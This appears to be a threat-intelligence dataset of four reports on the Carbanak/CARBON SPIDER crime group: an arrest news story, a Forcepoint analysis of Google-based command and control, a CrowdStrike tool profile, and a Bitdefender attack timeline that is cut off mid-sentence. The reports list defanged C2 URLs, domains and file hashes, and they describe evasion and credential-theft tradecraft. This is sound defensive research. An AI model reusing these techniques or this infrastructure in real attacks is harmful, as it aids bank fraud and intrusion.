carbanak,cti-hal,a3d8a4a0b10a,G0008,"Alleged Mastermind Behind Carbanak Crime Gang Arrested | Threatpost 16/07/24, 09:00 Podcasts / Malware / Vulnerabilities / InfoSec Insiders / Webinars Search Facebook Cracks Down On Data Misuse With Expanded Bug Bounty Program Bad Microsoft Meltdown Patch Made Some Windows Systems Less Secure Alleged Mastermind Behind Carbanak Crime Gang Arrested Author: Lindsey O'Donnell March 27, 2018 / 5:28 pm 3 minute read Share this article:   INFOSEC INSIDER Securing Your Move to the Hybrid Cloud August 1, 2022 Why Physical Security Maintenance Should Never Be an Afterthought July 25, 2022 Conti’s Reign of Chaos: Costa Rica in the Crosshairs July 20, 2022 How War Impacts Cyber Insurance July 12, 2022 Rethinking Vulnerability Management in a Heightened Threat Landscape July 11, 2022 The suspected leader behind the cyber crime group that targeted banks to rack up more than one billion Euros in damage over the past few years has been apprehended, according to the Spanish National Police. The suspected mastermind behind the Carbanak criminal gang, which is notorious for stealing as much as $1 billion from more than 100 ﬁnancial institutions in a string of attacks, has been apprehended, according to the Spanish National Police. According to the European Union Agency for Law Enforcement Cooperation (aka Europol), the cyber crime syndicate designed sophisticated malware to attack banks, e-payment systems and ﬁnancial institutions. The Carbanak group is best known for its malware – Carbanak and Cobalt – and a 2015 string of hacks that pilfered as much as $1 billion from ﬁnancial institutions. “The criminal operation has struck banks in more than 40 countries and has resulted in cumulative losses of over EUR 1 billion for the ﬁnancial industry,” according to Europol’s statement. “The magnitude of the losses is signiﬁcant: the Cobalt malware alone allowed criminals to steal up to EUR 10 million per heist.” The crime group would send out bank employees spear phishing emails, impersonating legitimate companies, which harbored a malicious attachment. If the attachments were executed, the criminals would use their malware to remotely control the victims’ machines, giving them access to the internal banking network and allowing them to infect servers controlling the ATMs. The malicious actor then remotely instructed ATMs to dispense cash at a pre-determined time, with one of the gang members waiting nearby. The hacking group also use the e-payment networks to transfer money from ﬁnancial companies into criminal accounts. https://threatpost.com/alleged-mastermind-behind-carbanak-crime-gang-arrested/130831/ Pagina 1 di 4 Alleged Mastermind Behind Carbanak Crime Gang Arrested | Threatpost 16/07/24, 09:00 “The criminal proﬁts were also laundered via cryptocurrencies, by means of prepaid cards linked to the cryptocurrency wallets which were used to buy goods such as luxury cars and houses,” according to Europol. The group ﬁrst launched a campaign in 2013 using malware known as Anunak to target ﬁnancial transfers and ATM networks of ﬁnancial institutions, but by the following year that malware had been improved into a more sophisticated version known as Carbanak. “From then onwards, the crime syndicate focused their efforts into developing an even more sophisticated wave of attacks by using tailor- made malware based on the Cobalt Strike penetration testing software,” according to Europol. The organized crime group has been business since 2013 but its malware has been continually evolving and growing more sophisticated over the years. As recently as January 2017, Carbanak ramped up its activity to include a new host of targets – including hitting a number of organizations in the hospitality, restaurant and retail markets, as well as a new command and control strategy involving Google’s cloud-based services like Google Forms and Google Sheets. In May 2017, reports emerged of the cyber gang devising a new way to gain persistence on targeted systems, involving a bogus instance of a Microsoft Windows app compatibility feature to more effectively pull off ﬁnancially motivated crimes. Europol, who supported the Spanish National Police in the investigation and subsequent arrest, said the gang leader, whom it didn’t identify by name, was arrested in Alicante, Spain. Reports state Spain’s Interior Ministry named the suspect as Denis K, a Ukrainian national. Vitali Kremez, senior intelligence analyst at Flashpoint, said the arrest was “great news” in a tweet. https://threatpost.com/alleged-mastermind-behind-carbanak-crime-gang-arrested/130831/ Pagina 2 di 4 Alleged Mastermind Behind Carbanak Crime Gang Arrested | Threatpost 16/07/24, 09:00 Vitali Kremez @VK_Intel · Follow Great news on the #CobaltGang/#Carbanak investigation: one key #cybercriminal was arrested in Spain; alleged to have sold the compromised stolen information from hotel and bank industries on underground communities. Great job @Europol europol.europa.eu/newsroom/news/… 4:19 PM · Mar 26, 2018 28 Reply Share Read more on X “The arrest of the key ﬁgure in this crime group illustrates that cybercriminals can no longer hide behind perceived international anonymity,” said Steven Wilson, Head of Europol’s European Cybercrime Centre in a statement. “This is another example where the close cooperation between law enforcement agencies on a worldwide scale and trusted private sector partners is having a major impact on top level cybercriminality.” The Carbanak criminal gang has been a thorn in the side of the security community for years. It’s tactics and targets were ever changing. In Jan. 2017, Carbanak moved from an almost exclusive focus on ﬁnancial services and switched targets to those within the hospitality, restaurant and retail markets. “They are very stubborn and very good,” remarked Trustwave last year. “They’ve been doing it for years; it’s their profession. Their malware and capabilities are cutting edge. They don’t make dumb mistakes. They’re stealthy how they inﬁltrate victims, they’re good at lateral movement and leaving backdoors so that it’s easy to re-engage. It’s their professionalism really.” The gang’s inﬂuence on other cybercriminals was also noted by cybersecurity professionals. In November, Kaspersky Lab observed a group called Silence, which bares a sharp resemblance to Carbanak. The spear-phishing emails contain attachments that eventually download and execute a dropper that reaches out to the attacker’s infrastructure. The backdoor is used to send system information and execute malicious code that uploads data, steals credentials and initiates tasks such as screen recording, which was a hallmark of Carbanak. Share this article:     https://threatpost.com/alleged-mastermind-behind-carbanak-crime-gang-arrested/130831/ Pagina 3 di 4"
carbanak,cti-hal,e27138b6468e,G0008,"Carbanak Group uses Google for Malware C&C | Forcepoint 20/07/24, 12:19 Why Forcepoint Data Security Everywhere Data-first SASE Resources Talk to an Expert Home : Blogs : Carbanak Group uses Google for malware command-and-control January 17, 2017 | 5 min read Carbanak Group uses Google for malware command-and-control X-Labs google malware F orcepoint Security Labs™ recently investigated a trojanized RTF document which we tied to the Carbank criminal gang. The document contains an encoded Visual Basic Script (VBScript) typical of previous Carbanak malware. Recent samples of the malware have now included the ability to use Google services for command-and-control (C&C) communication. We have notified Google of the abuse and are working with them to share additional information. Carbanak (also known as Anunak) are a group of financially motivated criminals first exposed in 2015. The actors typically steal from financial institutions using targeted malware. Recently a new Carbanak attack campaign dubbed ""Digital Plagiarist"" was exposed where the group used weaponized office documents hosted on mirrored domains, in order to distribute malware. Weaponized document The RTF document we analyzed (SHA1 1ec48e5c0b88f4f850facc718bbdec9200e4bd2d) has an embedded OLE object which contains a VBScript file. When the document is opened the targeted user is lured into double-clicking on the embedded OLE object which is disguised as an image: In the article Abusing Google for C&C communication Carbanak Documents Carbanak Google Apps Script C&Cs Carbanak Google Forms C&Cs Carbanak C&Cs Carbanak Cobalt Strike / Meterpreter DNS Beacon C&Cs https://www.forcepoint.com/blog/x-labs/carbanak-group-uses-google-malware-command-and-control Pagina 1 di 6 Carbanak Group uses Google for Malware C&C | Forcepoint 20/07/24, 12:19 Double clicking on the image results in a file open dialog for ""unprotected.vbe"". If the user executes this file then the VBScript malware will begin to execute. Encoded VBScript malware The VBScript malware inside the RTF document (SHA1 cd75662751c59951717b4704ea2cdb6fb7ec19bc) is an encoded VBScript file. We decoded the script and found hallmarks typical of the Carbanak group's VBScript malware, however we also found the addition of a new ""ggldr"" script module. The module is base64 encoded inside the main VBScript file along with various other VBScript modules used by the malware. When we analyzed the script we noticed that it is capable of using Google services as a C&C channel. Abusing Google for C&C communication The ""ggldr"" script will send and receive commands to and from Google Apps Script, Google Sheets, and Google Forms services. For each infected user a unique Google Sheets spreadsheet is dynamically created in order to manage each victim. The use of a legitimate third party service like this one gives the attacker the ability to hide in plain sight. It is unlikely that these hosted Google services are blocked by default in an organization, so it is more likely that the attacker will establish a C&C channel successfully. The C&C procedure is outlined in the diagram below. https://www.forcepoint.com/blog/x-labs/carbanak-group-uses-google-malware-command-and-control Pagina 2 di 6 Carbanak Group uses Google for Malware C&C | Forcepoint 20/07/24, 12:19 Upon the first attempt to contact the hard-coded Google Apps Script URL with the user's unique infection ID, the C&C will state that no spreadsheet currently exists for the user. The malware will then send two requests to another hard-coded Google Forms URL which will result in the creation of unique Google Sheets spreadsheet and Google Form IDs for the victim. The second time the Google Apps Script is requested, the C&C will return the unique Google Sheet and Google Form ID values: The ""entry"" value is also a unique ID which is sent with each subsequent Google Forms C&C request. Protection statement Forcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack: Stage 5 (Dropper File) - The malware components are prevented from being downloaded and/or executed. Stage 6 (Call Home) - The HTTP-based Carbanak C&C traffic is blocked. Summary The Carbanak actors continue to look for stealth techniques to evade detection. Using Google as an independent C&C channel is likely to be more successful than using newly created domains or domains with no reputation. Forcepoint will continue to https://www.forcepoint.com/blog/x-labs/carbanak-group-uses-google-malware-command-and-control Pagina 3 di 6 Carbanak Group uses Google for Malware C&C | Forcepoint 20/07/24, 12:19 monitor this group's activities and share data with trusted partners. Indicators of Compromise Carbanak Documents 1ec48e5c0b88f4f850facc718bbdec9200e4bd2d (3-ThompsonDan.rtf) 400f02249ba29a19ad261373e6ff3488646e95fb (order.docx) 88f9bf3d6e767f1d324632b998051f4730f011c3 (claim.rtf) Carbanak Google Apps Script C&Cs hxxps://script.google[.]com/macros/s/AKfycbzuykcvX7j3TlBNyQfxtB1mqii31b4VTON640yiRJT0t6rS4s4/exec hxxps://script.google[.]com/macros/s/AKfycbxxx5DHr0F8AYhLuDjnp7kGNELq6g27J4c_JWWx1p1nDfZh6InO/exec hxxps://script.google[.]com/macros/s/AKfycbwZHCgg5EsCiPup_mNxDbSX7k7yBMeXWenOVN1BWXHmyBpb8ng/exec Carbanak Google Forms C&Cs hxxps://docs.google[.]com/forms/d/e/1FAIpQLScx9gwNadC7Vjo11mXLbU3aBQRrqVpoWjmNJ1ZneqpjaYLE3g/formResponse hxxps://docs.google[.]com/forms/d/e/1FAIpQLSfE9kshYBFSDAfRclW8m9rAdajqoYhzhEYmEAgZexE3LQ-17A/formResponse hxxps://docs.google[.]com/forms/d/e/1FAIpQLSdcdE7lTEiqV5MW3Up8Hgcy5NGkIKnLKoe0YPFriD4_9qYq9A/formResponse Carbanak C&Cs hxxp://atlantis-bahamas[.]com/css/informs.jsp hxxp://138[.]201[.]44[.]4/informs.jsp Carbanak Cobalt Strike / Meterpreter DNS Beacon C&Cs aaa.stage.15594901.en.onokder[.]com aaa.stage.4710846.ns3.kiposerd[.]com About Forcepoint Forcepoint is the leading user and data protection cybersecurity company, entrusted to safeguard organizations while driving digital transformation and growth. Our solutions adapt in real-time to how people interact with data, providing secure access while enabling employees to create value. Learn more about Forcepoint https://www.forcepoint.com/blog/x-labs/carbanak-group-uses-google-malware-command-and-control Pagina 4 di 6"
carbanak,cti-hal,96da49e10e1e,G0046,"16/07/24, 16:42 Pagina 1 di 1 Arrests Put New Focus on CARBON SPIDER Adversary Group Paul Moon In an indictment unsealed by the U.S. Department of Justice (DoJ) on Aug. 1, 2018, three Ukrainian nationals have been charged with conspiracy, wire fraud, computer hacking, access device fraud and aggravated identity theft. Dmytro Fedorov, 44, Fedir Hladyr, 33, and Andrii Kopakov, 30, are suspected to be key members within CARBON SPIDER’s point of sale (POS) subgroup. The arrests took place between January and June 2018, and coincided with a slowdown in CARBON SPIDER activity. The DoJ announcement also details the group’s use of a front company, named Combi Security, to recruit developers and intrusion specialists for its operations. Given that other members of this subgroup remain at large, it is likely that the tactics, techniques and procedures (TTPs) may change but activity will continue. CARBON SPIDER, more widely known as the Carbanak group, is a long-standing criminal enterprise responsible for compromising banks to transfer funds to mule accounts, performing ATM jackpotting attacks, and conducting mass compromise of debit and credit cards from POS terminals in large enterprises. They have been active in some form since at least 2013. During that time, the group has focused on the banking, financial, media, technology, hospitality, and food and beverage verticals, using targeted campaigns to reach their objectives. Untangling the CARBON SPIDER Web The structure of CARBON SPIDER is very complex and was initially suspected to be a single group, based on their use of several custom tools and specific TTPs. However, further research into the structure indicates that there are several clusters of activity likely made up of subgroups serving different missions, potentially with access to a shared development environment and pool of resources. A complex structure such as this is difficult to manage and speaks to the sophistication of the actor. This blog aims to examine CARBON SPIDER over time and attempts to describe their changing relationship within the eCrime ecosystem. Custom Tools CARBON SPIDER has leveraged many custom tools since it began activity in 2013, including its primary implant Sekur (a.k.a. Anunak). These include the following: Sekur Name Sekur Aliases Anunak and Carbanak RAT First Seen February 2014 (based on compile time) Last Seen November 2017 (based on compile time) Purpose Primary remote access toolkit (RAT) for monitoring victim systems of interest Type Microsoft Windows executable f70cef297efe9ec0abea369b3c1235f14220a6165b48f6e8aa054296078122c8 Machine learning: Cloud-based, on-sensor indicators of attack(IOAs): Suspicious activity Example Hash Falcon EPP protection MITRE ATT&CK™ technique analysis from Hybrid Analysis Sekur has been CARBON SPIDER’s primary tool for several years, although usage over the last year appears to have declined. It contains all the functionality you would expect from a RAT, allowing the adversary to execute commands, manage the file system, manage processes, and collect data. In addition, it can record videos of victim sessions, log keystrokes, enable remote desktop, or install Ammyy Admin or VNC modules. From July 2014 on, samples were compiled with the capability to target Epicor POS systems and to collect credit card data. Agent ORM Name Agent ORM Aliases Toshliph and DRIFTPIN First Seen June 2015 (based on compile time) Last Seen May 2016 (based on compile time) Purpose First-stage information collection and downloading next-stage payloads Type Microsoft Windows executable 36937e5e744873b3646c9d345e8cf50fb969029dc77525acfe63d5a9d28b73f2 Machine learning: Cloud-based, on-sensor IOAs: Suspicious activity Example Hash Falcon EPP protection MITRE ATT&CK™ technique analysis from Hybrid Analysis Agent ORM began circulating alongside Sekur in campaigns throughout the second half of 2015. The malware collects basic system information and is able to take screenshots of victim systems. It is used to download next-stage payloads when systems of interest are identified. It is strongly suspected that Agent ORM has been deprecated in favor of script-based first-stage implants (VB Flash, JS Flash, and Bateleur). VB Flash Name VB Flash Aliases HALFBAKED First Seen September 2015 (based on observed distribution) Last Seen May 2017 (based on observed distribution) Purpose First-stage information collection and downloading next-stage payloads Type VBScript Example Hash Falcon EPP protection a7a927bd44040817ae39e15aeb3f0b69ca943d4ce5b00d12eed6fae5b1c325d0 IOAs: Attacker methodology; Suspicious activity VB Flash was first observed being deployed alongside Agent ORM in September 2015. It is likely that this was developed as a replacement to Agent ORM and contained similar capabilities. The first observed instance of VB Flash included comments and was easy to analyze—later versions soon began to integrate multiple layers of obfuscation. Several versions of VB Flash were developed including ones that utilized Google Forms, Google Macros, and Google Spreadsheets together to make a command-and-control (C2) channel. This variant would POST victim data to a specified Google form, then make a request to a Google macro script, receiving an address for a Google Spreadsheet from which to request commands. JS Flash Name JS Flash Aliases JavaScript variant of HALFBAKED First Seen May 2017 (based on observed distribution) Last Seen November 2017 (based on observed distribution) Purpose First-stage information collection and downloading next-stage payloads Type JavaScript Example Hash Falcon EPP protection ffebcc4d2e851baecd89bf11103e3c9de86f428fdeaf0f8b33d9ea6f5ef56685 IOAs: Attacker methodology; Suspicious activity JS Flash capabilities closely resemble those of VB Flash and leverage interesting techniques in deployment via batch scripts embedded as OLE objects in malicious documents. Many iterations of JS Flash were observed being tested before deployment, containing minor changes to obfuscation and more complex additions, such as the ability to download TinyMet (a cutdown of the Metasploit Meterpreter payload). PowerShell was also used heavily for the execution of commands and arbitrary script execution. No JS Flash samples were observed being deployed after November 2017. Bateleur Name Bateleur Aliases N/A First Seen June 2017 (based on observed distribution) Last Seen April 2018 (based on observed distribution) Purpose First-stage information collection and downloading next-stage payloads Type JavaScript da70df51aa80414fcba9bf7322e44e8ea5ed6a3725f342cd05c733376c6f2121 IOAs: Malicious document; Establishing persistence. Example Hash Falcon EPP protection MITRE ATT&CK™ technique analysis from Hybrid Analysis Bateleur deployments began not long after JS Flash and were also written in JavaScript. Deployments were more infrequent and testing was not observed. It is likely that Bateleur was run in parallel as an alternative tool and eventually replaced JS Flash as CARBON SPIDER’s first stage tool of choice. Although much simpler in design than JS Flash, all executing out of a single script with more basic obfuscation, Bateleur has a wealth of capabilities—including the ability to download arbitrary scripts and executables, deploy TinyMet, execute commands via PowerShell, deploy a credential stealer, and collect victim system information such as screenshots. Clusters of Activity Based on the use of these tools, it is possible to group the CARBON SPIDER activity into several clusters. These clusters may represent different groups with a common tool supply chain, or isolated campaigns from the same group, using separate individuals to carry out attacks with a different focus. Point of Sale (POS) Targeting Target Region Target Sector Active From Primarily U.S. and Western Europe Enterprises that process many card transactions (in particular casinos, hotels, and restaurant chains) At least mid 2015 Active To Current The POS cluster is the most prolific associated to the CARBON SPIDER actor and is also known as FIN7. This cluster has used all the custom tools described with VB Flash, JS Flash, and Bateleur that are unique to them. Over time, they have used targeted spear phishing emails to deploy malicious documents that initially used exploits; more recently, they have used macros and OLE embedded objects. The primary method of cash out for this group is the acquisition and sale of credit and debit card dumps from POS devices. Many of the stolen cards are sold as collectives on the eCrime marketplace, Joker’s Stash. Targeting of Russian Financial Institutions Target Region Russia Target Sector Financial and banking Active From Late 2013 Active To Early 2015 This cluster can also be described as the original Carbanak group. It is suspected that they stole large sums of money using several cash out methods against Russian banks, at which point the group may have diverged. It is likely that they developed the primary CARBON SPIDER implant Sekur and were, at the point of being operational, probably the only users of it. Targeting of Middle Eastern Financial Institutions Target Region Middle East and South Asia Target Sector Financial and banking Active From October 2014 Active To Activity reported up to at least early 2016 Although the targeting profile is the same as the Russian banking cluster, the TTPs are very different. In particular, the use of tooling stands out from other clusters of CARBON SPIDER activity. As with other clusters, the primary infection vector is targeted spear phishing emails that use exploits for a variety of vulnerabilities in Microsoft Office: CVE-2015-2545 CVE-2014-4114 CVE-2015-1770 CVE-2015-1641 A custom .NET first stage payload is deployed that in some cases deploys Agent ORM or Sekur, but is also used to deploy NetWire. Instances of DarkComet and Morphine RAT use some custom .NET downloader servers as their C2. One possibility is that CARBON SPIDER outsourced deployment of their malware for this campaign. An alternative theory is that this is a seperate group also using CARBON SPIDER tools. Little is reported publicly about the successfulness of this cluster of activity, and no cash out methods are known. Targeting of Eastern European Financial Institutions Target Region Ukraine and Eastern Europe Target Sector Likely financial and banking Active From Mid-2015 Active To Last known activity in late 2015 The Eastern European banking cluster is based on a single campaign using a strategic web compromise of an Italian bank in Ukraine to deploy instances of Agent ORM to likely Ukrainian targets. It is likely that this cluster links to one of the other clusters of Sekur activity, possibly the unattributed activity discussed below. However, no follow-on actions have been observed past Agent ORM deployment. Unattributed Target Region Target Sector Where known (appears to be Ukraine) Not known in most cases (one case focused on news and media organizations) Active From May 2015 Active To At least January 2017 The unattributed activity is based on a cluster of Sekur activity that runs in parallel with the POS cluster of activity, but does not exhibit the same TTPs (with differences in Sekur configuration, campaigns, and infrastructure selection). Many of these samples were submitted from Ukraine; additionally, one of them was deployed using a malicious document with a decoy that suggests Ukrainian news and media targeting. It is possible that this activity relates to the Eastern European bank cluster of Agent ORM activity; yet without further evidence of follow-on activity, it is not possible to determine this cluster’s action on objectives. Timeline Below is a timeline showing the activity of each of the five clusters of CARBON SPIDER activity: The timeline shows that several of these clusters of activity started just after public reporting of the group (around mid-2015) and that the divergence in activity may have been the result of this exposure. It also highlights that CARBON SPIDER now likely operates multiple parallel missions focusing on different regions and sectors. Links to Other Targeted eCrime Groups Beyond the described clusters of CARBON SPIDER activity based around their custom tools, their are also interesting links to other tracked, targeted eCrime activity. This includes the group dubbed RATPAK SPIDER (also known as Buhtrap) that targets Russian and Ukrainian financial institutions, a group dubbed Odinaff targeting SWIFT systems particularly in Eastern Europe, and the group COBALT SPIDER (also known as Cobalt) that, again, specializes in targeting Russian banks. RATPAK SPIDER Operation Buhtrap had a similar target scope (Russian financial) to the first cluster of CARBON SPIDER activity. Although these have always been tracked as seperate groups, there is a technical link between payload deployments. A custom macro dropper that would encode the payload using VB Script notation, and contained the strings “After OnTime” and “FUCK AV,” was observed in only 19 unique samples across Crowdstrike sample stores. One of the payloads was an instance of Agent ORM used to targeted casinos; a second payload also used by CARBON SPIDER was an instance of Sekur. The other six unique payloads observed being deployed using this custom macro dropper were instances of the Nullsoft Scriptable Install System (NSIS) downloader attributed to the Buhtrap group. Initially, this led to tracking both threats as CARBON SPIDER. Although it now appears that Buhtrap is likely a separate entity, the use of this shared deployment mechanism — unique to these two groups — suggests a common supply chain or developer and a closer working relationship, especially given some similarities in target scope. Odinaff A SWIFT compromise was observed in mid-2016, targeting a Ukrainian bank that at the time was unattributed. Based on similar TTPs, it was hypothesised that this could be CARBON SPIDER activity; however, although common off-the-shelf tools (such as Meterpreter and Cobalt Strike) were used, the custom CARBON SPIDER arsenal was not present. Later, this group was reported in open source as Odinaff. In addition to similar TTPs, there appeared to be some infrastructure overlap with two IP addresses. One Odinaff C2 was also reported to be in previous use as a Sekur plugin server. A second IP was also reported to be used by CARBON SPIDER in a previous campaign. Again, this may just be a shared hosting provider, but the TTP similarity makes this infrastructure overlap more noteworthy. COBALT SPIDER The Cobalt group, tracked by CrowdStrike intelligence as COBALT SPIDER, bears many similarities in the targeting of banks to the Russian cluster of CARBON SPIDER activity. Both groups also use Cobalt Strike and several other pen-testing tools in their operations; nevertheless, the two groups appear to be distinct outside of this. On March 26, 2018, an announcement was made that a Russian citizen identified by authorities as “Denis K.” was arrested by the Spanish national police in Alicante, Spain. He was reportedly involved in early CARBON SPIDER targeting of Russian banks and is suspected of being one of the members of COBALT SPIDER. Although reports suggest that he may have been a leader of COBALT SPIDER, activity has continued from this group, suggesting his role was not a key one within this organization. This suggests a link between the two groups between 2013 and likely, 2015. This is around the time that the dominant focus for CARBON SPIDER became targeting the POS systems of Western enterprises. It is possible that at least one individual left CARBON SPIDER and either joined forces with or created COBALT SPIDER. Summary CARBON SPIDER is the pioneer of targeted eCrime activity with some of the largest publicly attributed success. Their level of sophistication across the clusters of activity makes them a key player in the eCrime ecosystem. Although there is not enough evidence to directly link CARBON SPIDER to other targeted criminal groups, it is assessed with high confidence (based on analysis of artifacts and infrastructure over time) that CARBON SPIDER shares resources with other notable criminal groups. There are two possible hypotheses as to how the clusters of CARBON SPIDER activity are linked. One theory is that they were originally one group that splintered into several with different focuses. Several of the splinter groups may have maintained access to their custom tools (e.g., Sekur), while others moved on to work with other actors (e.g., COBALT SPIDER). A second theory is that CARBON SPIDER operates as distinct groups with different focuses, but they report to a single management structure. Resources may be shared between the groups, but each has its own members. At this stage, the first theory appears to be the most likely. Based on recently observed tooling and operations, CARBON SPIDER appears to be focusing their efforts on the POS cluster of activity against the hospitality and restaurant sector, with no recently reported activity against banks. They also appear to be moving away from their custom tooling, with no Sekur samples compiled since November 2017 and fewer samples appearing in live operations. Going forward, it is likely that CARBON SPIDER will continue operations to target sectors that give the best financial return for their efforts. For the short term, this will likely mean a continued focus on POS systems and large enterprises that process them. It is possible that they may return to target banks, but this would likely be on a small scale with very focused operations. CARBON SPIDER will likely move completely away from their old custom toolset, either developing new tools or using commodity off-the-shelf packages to achieve their objectives. This is even more assured given the arrests of three members of the most prolific CARBON SPIDER subgroup. As CARBON SPIDER adversary groups retool and alter their TTPs CrowdStrike will continue to track this adversary leveraging CrowdStrike CrowdStrike Falcon® Intelligence capabilities to combine endpoint protection, automation and malware analysis to prevent CARBON SPIDER from breaching our customer networks. To learn more about how to incorporate intelligence on threat actors like CARBON SPIDER into your security strategy, please visit the Falcon Intelligence product page. Download the CrowdStrike 2020 Global Threat Report"
carbanak,cti-hal,74113271da5e,G0008,"An APT Blueprint: Gaining New Visibility into Financial Threats Bitdefender Forensic Investigation Reveals Complete Attack Timeline and Behavior of Notorious Financial Cyber Criminal Group White Paper Executive Summary In mid-2018, Bitdefender researchers investigated a targeted attack on an Eastern European financial institution, gaining new insights and creating a complete event timeline showing how the infamous group Carbanak infiltrates organizations, how it moves laterally across the infrastructure, and the time it takes to set up the actual heist. The initial point of compromise found in our investigation involved the use of spear-phishing emails with malicious URLs and tainted documents rigged to download a Cobalt Strike beacon component. Within hours of compromise, the cybercriminal group would begin to move laterally across the infrastructure, identify critical documents and prepare them for exfiltration, and try to access the organization’s ATM and banking applications. Bitdefender’s forensic analysis revealed some key compromise tactics: • • • • • • Financial institutions in Eastern Europe remain the primary focus of the criminal group, which uses spear phishing as the main attack vector The presence of Cobalt Strike hacking tools is the key indicator that the financial institutions were targeted by the Carbanak cyber-criminal gang In the reconnaissance phase, data related to banking applications and internal procedures was collected and prepared for exfiltration, to be used for the final stage of the attack Infrastructure reconnaissance mainly occurred after business hours or on weekends to avoid triggering security alarms It only took attackers a couple hours from initial compromise to fully established foothold and lateral movement, showing experience, knowledge and coordination The final goal of the targeted attack was to compromise the ATM networks, potentially to cash out at ATMs in a coordinated physical and infrastructure criminal operation Several spear-phishing campaigns attributed to Carbanak, all occurring between March and May 2018, were analyzed by security researchers in 2018. These campaigns impersonated emails from high-profile organizations, such as IBM or European Central Bank, but also cybersecurity companies. While most forensic investigations focus on offering a highly technical analysis of the payloads used by the Carbanak group, Bitdefender’s investigation offers a complete timeline of events, from the moment the email reached the victim’s inbox to the moment of the heist. [2] White Paper A History of Criminal Activity One of the most prolific APT-style cyberattacks, specifically targeting the financial sector, is known as Carbanak. Discovered in 2014, the campaign quickly gained notoriety after compromising the security systems of 100 banks in 40 countries and stealing up to $1 billion in the process. Banks in countries such as Russia, the United Kingdom, the Netherlands, Spain, Romania, Belarus, Poland, Estonia, Bulgaria, Georgia, Moldova, Kyrgyzstan, Armenia, Taiwan and Malaysia have allegedly been targeted with spear- phishing emails, luring victims into clicking malicious URLs and executing booby-trapped documents. The same group is believed to have also been using the Cobalt Strike framework to run sophisticated campaigns, plotting and performing financial heists of financial institutions. Following an investigation led by law enforcement in cooperation with cybersecurity companies, the leader of the group was apprehended in Alicante, Spain, on March 26th, 2018. However, this action doesn’t appear to have made a dent in the cybercriminal organization, as subsequent spear-phishing campaigns seem to have been reported from March until May 2018. Spearphishing Campaigns Timeline March 7th-10th Emails sent from fake domains: ibm-cert.com, ibm-warning.com, ibm- notice.com March 15th Emails impersonated VeriFon (a large POS terminal vendor) and used the fake dns-verifon.com domain. March 26th Phishing emails pertaining to be from SpamHaus (non-profit organization that fights spam and phishing). They registered the spamhuas.com domain and cloned the content from the official website (spamhaus. org). April 3rd The group used compromised mail servers of a Swedish company. May 18th Impersonated the SWIFT payment system and embedded documents with a JavaScript backdoor. A similar attack was used on USA and Europe banks. May 23rd Spearphishing emails claiming to be from a security vendor. May 28th Spearphishing emails impersonating the European Central Bank. They contained a JavaScript backdoor. A Carbanak trademark in cyberattacks remains the use of Cobalt Strike – a powerful pentesting tool designed for exploiting and executing malicious code, simulating post-exploitation actions of advanced threat actors – which allows them to infiltrate the organization, move laterally, exfiltrate data, and deploy anti-forensic and evasion tools. While the end results of such an attack can be easily assessed in financial losses, little information has been publicly available until now on how the attack occurs step-by-step within a compromised organization. [3] White Paper Modus Operandi The APT-style cybercriminal group has a long track record of successfully targeting financial institutions around the world to either cash out at ATMs or perform wire transfers using the bank’s internal systems. The spear-phishing emails sent to the financial institutions either end up with victims downloading a tampered document meant to download the Cobalt Strike beacon or to exploit several unpatched Remote Code Execution Vulnerabilities and deploy a backdoor. Once the user attempts to open the attached documents, scripts (Fig. 1) embedded within the files are dropped on the disk and automatically executed in the background. This is a popular technique, sometimes associated with advanced persistent threats (APTs) attributed to nation-sponsored threat actors. Fig. 1 - Windows Script Component (.sct) file sample, embedded in spearphishing attachment (md5: bb784d55895db10b67b1b4f1f5b0be16) Designed for stealth infiltration within the targeted system, the attacks use reconnaissance tools designed to assess the state of the victim’s workstation and determine what tools should be downloaded next, or even open decoy documents similar to the one in Fig.2, to avoid drawing victims’ suspicion. Bitdefender’s Investigation, Resulting in a Complete Attack Timeline Bitdefender’s forensics and investigation team was contacted to look into a security incident that started in May 2018 with an email received by two of the bank’s employees. As previously mentioned, the date coincides with a Carbanak spear-phishing campaign. The attack target was to gain access to banking systems and eventually withdraw funds in cash from ATMs. The pattern exhibited by attackers and their lateral movements across the infrastructure show that they knew what types of information to look for and they were skilled at evasion techniques. Judging by the way the adversaries interacted with different systems, the targeted hosts and the documents prepared for exfiltration, it appears that the cybercriminal group focused initially on mapping the internal processes and applications of the affected institution. They displayed a deep understanding of the nature and location of the data they sought. They were able to maintain a low network footprint and avoid suspicion by using selected single workstations as a hub for centralizing collected information and for communication with their command & control server, outside the regular working hours of the bank. After compromising the first victim, the aggressors’ next goal was to find admin-level credentials that would allow them to move across the entire infrastructure. By performing all these operations outside business hours and limiting their interaction to only a handful of systems, the cybercriminal group minimized the detection opportunities. [4] White Paper A carefully executed network reconnaissance and lateral movement plan was unfolding during this time. What follows is a timeline of events that started with the initial spear-phising email. Initial compromise Two victims were tricked into opening the spear-phishing attachment, initially compromising two separate endpoints. Day 0 (day of initial compromise) 16:48 – one of the employees opened the document within the spear-phishing email 16:49 – a second employee opened the same tainted document. The document opened by both employees used three exploit methods for Remote Code Execution in Microsoft Word: CVE-2017-8570, CVE-2017-11882, and CVE-2018-0802. To distract the user from the attack occurring in the background, a decoy document (fig 2) was used. Finally, a backdoor from the Command and Control Server was used to establish persistence in the infrastructure. Fig. 2 - Decoy document sample displayed on the victim’s machine (md5: c2a9443aac258a60d8cace43e839cf9f) At this point, the adversary had the ability to download and execute new payloads, download additional scripts, run shell commands to move laterally in the infrastructure, and delete files from the system and cleaning registry keys to leave fewer forensics traces. [5] White Paper Network lateral movement & data collection In this phase, attackers compromised additional network endpoints, gathering data and using one of the endpoints for collecting and storing internal documents that appeared of interest. Day 0 (continued) 17:05 to 18:20 As soon as the first spear-phishing email was accessed, events occurred as follows: - - - - Three Microsoft Word exploits (mentioned above) were used; Cobalt Strike beacon was delivered and used to discover and map the organization’s internal network, with the purpose of collecting administrative level credentials; Credentials for one Domain Administrator were compromised and used throughout the duration of the attack; Credentials were “tested” on one of the Domain Controller servers to make sure they’re valid, resulting in its compromise At least two more endpoints were compromised by the end of the day. Days 1 to 28 Numerous workstations were systemically compromised in a search for critical information that the cybercriminals could use. Day 10 Attack reaches another compromised, which will later be used to store documents related to internal applications, manuals and other potentially valuable documents. Day 28 A series of potentially valuable documents pertaining to internal applications and procedures were identified and prepared for exfiltration. Internal Servers Compromised Lateral movements and intelligence collection continue, while attackers also target and compromise additional internal hosts and servers that will be used during the actual heist. Between Day 30 to 46, over a period of 17 days, a series of archives were created containing manuals, guides and training materials for different applications. The information gathered was archived and organized in different folders. This information was relevant in planning the attack on the bank and, potentially, other banks that share similar systems. The cybercriminal group could be actively improving its understanding 